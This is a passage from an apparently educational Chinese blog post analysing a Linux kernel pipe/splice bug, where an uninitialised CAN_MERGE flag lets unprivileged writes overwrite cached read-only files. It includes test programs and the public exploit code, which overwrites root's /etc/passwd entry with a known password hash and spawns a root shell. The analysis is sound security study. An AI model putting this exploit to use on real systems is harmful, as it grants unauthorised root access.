Log）技术。\nWAL技术在数据库系统中比较常见，在数据库中一般又称之为redo log，Linux 文件系统ext3/ext4称之为journaling。WAL作用是：写数据库或者文件系统前，先把相关的metadata和文件内容写入到WAL日志中，然后才真正写数据库或者文件系统。WAL日志是append模式，所以，对WAL日志的操作要比对数据库或者文件系统的操作轻量级得多。如果对WAL日志采用同步写模式，那么WAL日志写成功，即使写数据库或者文件系统失败，可以用WAL日志来恢复数据库或者文件系统里的文件。\n2、查看一个文件占用page cache情况可以借助于vmtouch工具：\n\nvmtouch is a tool for learning about and controlling the file system cache of unix and unix-like systems.\n\n\n3、一些注意点由于缓存页面可以很容易地被驱逐和重用，一些操作系统，特别是Windows NT，甚至将页面缓存使用情况报告为“可用”内存，而内存实际上是分配给磁盘页面的。这导致了一些关于在 Windows 中使用页面缓存的混乱。\ncache也容易产生测信道攻击，由于page cache与磁盘文件有pdflush措施，一般磁盘文件都有着严格的权限分离措施，所以page cache可能存在某些文件页面可以绕过权限分离并泄露有关其他进程的数据。这里的内容比较多，就不展开了。\n漏洞分析零、前言漏洞分析要养成一种由已知到未知的分析习惯，我们分析漏洞时，参考其他师傅的文章时，要想明白分析的具体思路是什么，具体的解决方法是什么。\n实际上该漏洞归纳的分析思路大致为：补丁对比-&gt;漏洞验证-&gt;前置知识了解-&gt;漏洞调试-&gt;exp分析。这是一个不断探索的过程，每一步的操作都是为下一步做铺垫，补丁对比的意义在于简单了解漏洞点，漏洞验证帮助我们了解这个漏洞是长什么样子，他能造成什么后果（文件写入，代码注入，信息泄露等等）；前置知识了解帮助我们了解函数功能或者系统运作方式等等知识，为分析漏洞打好基础；漏洞调试帮助我们完全理解漏洞成因；exp分析帮助我们了解漏洞的利用方式。\n我们按照这个顺序进行漏洞分析。\n一、补丁分析漏洞补丁如下\n\n可见补丁对buf-&gt;flags进行了初始化，可以推断经过漏洞的影响，buf-&gt;flags必不为0！\n目前我们不清楚buf-&gt;flags到底代表了什么含义。我们将带着这个问题进行源码分析。\n二、splice读写文件实验这里参考了漏洞发现者与ghost461师傅的文章，实验的内容为，编写两个程序，第一个程序对一个文件写入A，之后第二个程序调用splice函数将文件内容读取到管道，之后对管道写入B。发现执行完第一个程序时的文件内容全为A，而第二个程序执行后，文件内容里面竟然包含了B，明明第二个程序并没有写文件的操作。\n下面的代码参考自ghost461的文章：\npoc1\n// poc1.c#include &lt;stdio.h&gt;#include&lt;unistd.h&gt;#include &lt;fcntl.h&gt;int main() &#123;    const char* path = &quot;./tmpfile&quot;;    int fd = open(path,O_WRONLY);        while(1) &#123;        write(fd, &quot;AAAAA&quot;, 5);    &#125;        close(fd);    return 0;&#125;\n\npoc2\n// poc2.cpp#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/user.h&gt;#include &lt;string.h&gt;int main() &#123;    printf(&quot;title\\n&quot;);    const char* path = &quot;./tmpfile&quot;;    int fd = open(path, O_RDONLY);    int p[2];    ssize_t nbytes;    if (pipe(p)) abort();        const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);    static char buffer[4096];    for (unsigned r = pipe_size; r &gt; 0;) &#123;    unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;    write(p[1], buffer, n);    r -= n;    &#125;    for (unsigned r = pipe_size; r &gt; 0;) &#123;    unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;    read(p[0], buffer, n);    r -= n;    &#125;        nbytes = splice(fd, 0, p[1], NULL, 5, 0);    nbytes = write(p[1], &quot;BBBBB&quot;, 5);        close(fd);    return 0;&#125;\n\n执行程序poc1\n\n执行程序poc2\n\n可见我们没有对文件进行写，但文件中仍然存在我们输入到管道中的BBBBB\n重启后查看tmpfile文件\n\n重启后，B消失了，可见我们写入管道的BBBBB并没有真正的写入进文件中，而是写入了一块临时的内存空间中。\n三、动态分析我们在关键函数pipe_wirte与copy_page_to_iter_pipe下断点\n由于在poc代码中先完成了一段填满管道再将管道清空的操作，在填满管道的过程中会触发pipe_write函数，且在某个else分支会将buf-&gt;flags赋值为PIPE_BUF_FLAG_CAN_MERGE。\nif (is_packetized(filp))\t\t\t\t\tbuf-&gt;flags = PIPE_BUF_FLAG_PACKET;\t\t\t\t\t\t// PIPE_BUF_FLAG_PACKET == 0x8else\tbuf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;\t\t\t\t// PIPE_BUF_FLAG_CAN_MERGE == 0x10pipe-&gt;tmp_page = NULL;\n\n\n\n在经过多次命中pipe_write函数后，命中了copy_page_to_iter_pipe函数，在对pipe buf做初始化操作时并没有对buf-&gt;flags进行初始化，导致现在的buf-&gt;flags仍然是0x10，也就是PIPE_BUF_FLAG_CAN_MERGE。\n\n在splice系统调用后面的系统调用即为write，文件描述符传的是pipe的文件描述符，此时跟进pipe_write，进入该if分支，此时chars代表的字符数表示write函数传入的第二个参数。\n\npoc中如下\nconst char *const data = &quot;:$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\\n&quot;; // openssl passwd -1 -salt aaron aaron nbytes = write(p[1], data, data_size);\n\n\n\n下面会判断buf-&gt;flags是否置位PIPE_BUF_FLAG_CAN_MERGE，如果是，则将文件内容write进管道。\n\n至此就是整体的漏洞流程。\n四、exp分析这里分析的是最先公开的exp代码，我们尽量从已知来推断未知，代码用了大量的校验代码，在漏洞复现或利用时帮助我们精准的判断问题出在了哪里。\n首先备份原始的passwd，因为我们的修改会使其内容发生变化。再完成提权后，我们可以选择将这个备份后的passwd.bak文件再还原回去，尽量不露痕迹，或者在测试时可以还原现场。\nFILE *f1 = fopen(&quot;/etc/passwd&quot;, &quot;r&quot;);FILE *f2 = fopen(&quot;/tmp/passwd.bak&quot;, &quot;w&quot;);char c;while ((c = fgetc(f1)) != EOF)\tfputc(c, f2);fclose(f1);fclose(f2);\n\n之后创建管道，首先填满管道，这时pipe_write将buf-&gt;flags的PIPE_BUF_FLAG_CAN_MERGE位设置为1，之后清空管道，方便下一次poc的写入。此时该管道为空，且其缓冲区设置了PIPE_BUF_FLAG_CAN_MERGE标志，下次操作管道描述符时不会创建新的page，而是仍然使用原有的page进行操作。\n/** * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the * PIPE_BUF_FLAG_CAN_MERGE flag set. */int p[2];if (pipe(p)) abort();const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);static char buffer[4096];/* fill the pipe completely; each pipe_buffer will now havethe PIPE_BUF_FLAG_CAN_MERGE flag */for (unsigned r = pipe_size; r &gt; 0;) &#123;unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;write(p[1], buffer, n);r -= n;&#125;/* drain the pipe, freeing all pipe_buffer instances (butleaving the flags initialized) */for (unsigned r = pipe_size; r &gt; 0;) &#123;unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;read(p[0], buffer, n);r -= n;&#125;/* the pipe is now empty, and if somebody adds a newpipe_buffer without initializing its &quot;flags&quot;, the bufferwill be mergeable */\n\n之后触发漏洞。首先调用了splice将file page与pipe buf关联起来，之后write会调用pipe_write函数，判断buf-&gt;flags如果PIPE_BUF_FLAG_CAN_MERGE已置为，那么会直接操作pipe buf，也相当于操作了file page。\nconst char *const path = &quot;/etc/passwd&quot;;loff_t offset = 4; // after the &quot;root&quot;const char *const data = &quot;:$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\\n&quot;; // openssl passwd -1 -salt aaron aaron const size_t data_size = strlen(data);const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;const loff_t end_offset = offset + (loff_t)data_size;/* open the input file and validate the specified offset */const int fd = open(path, O_RDONLY); // yes, read-only! :-)/* splice one byte from before the specified offset into the   pipe; this will add a reference to the page cache, but   since copy_page_to_iter_pipe() does not initialize the   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */--offset;ssize_t nbytes = splice(fd, &amp;offset, p[1], NULL, 1, 0);/* the following write will not create a new pipe_buffer, but   will instead write into the page cache, because of the   PIPE_BUF_FLAG_CAN_MERGE flag */nbytes = write(p[1], data, data_size);\n\n此时可以当作root密码已经被修改，最终弹出shell\n\tchar *argv[] = &#123;&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;(echo aaron; cat) | su - -c \\&quot;&quot;                &quot;echo \\\\\\&quot;Restoring /etc/passwd from /tmp/passwd.bak...\\\\\\&quot;;&quot;                &quot;cp /tmp/passwd.bak /etc/passwd;&quot;                &quot;echo \\\\\\&quot;Done! Popping shell... (run commands now)\\\\\\&quot;;&quot;                &quot;/bin/sh;&quot;            &quot;\\&quot; root&quot;&#125;;        execv(&quot;/bin/sh&quot;, argv);// 执行的是下面的命令// /bin/sh -c &quot;(echo aaron; cat) | su - -c \\&quot;echo \\\\\\&quot;Restoring /etc/passwd from /tmp/passwd.bak...\\\\\\&quot;;cp /tmp/passwd.bak /etc/passwd;echo \\\\\\&quot;Done! Popping shell... (run commands now)\\\\\\&quot;;/bin/sh;\\&quot; root&quot;\n\n\n\n五、总结我们会发现如果了解前置知识后理解该漏洞竟是如此的简单，但是该漏洞的挖掘仍然是比较困难的，需要对splice和pipe等的这整块的内容熟悉，漏洞发现者也是在业务中发现了业务有些许异常才发现该漏洞。\n该漏洞的利用也很有意思，首先是buf-&gt;flags没有初始化，从而找到了pipe_write函数对PIPE_BUF_FLAG_CAN_MERGE的操作，本来这样无关痛痒，只是可以随意覆写管道，但是由于page cache的存在，令我们随意覆写管道转换成随意覆写文件，后面想到可以覆写/etc/passwd，最终达到提权的目的，实际上该漏洞也可以覆写其他文件，提权只是该漏洞的一种表现形式。如该方法就是利用了覆盖SUID文件\n其他文章也提到过，由于调用splice函数需要对文件有读权限，如果没有读权限，那么该漏洞就无法利用了。\n参考链接\n漏洞发现者的博客\n标准输入输出百度百科\n360 Nitro师傅的分析\npipe原理\nsplice man手册\n零拷贝的原理\nDMA维基百科\n原来 8 张图，就可以搞懂「零拷贝」了\nsendfile man手册\n知道创宇ghost461师傅的分析\nLinux Page Cache的理解\nPage cache维基百科\n\n"}]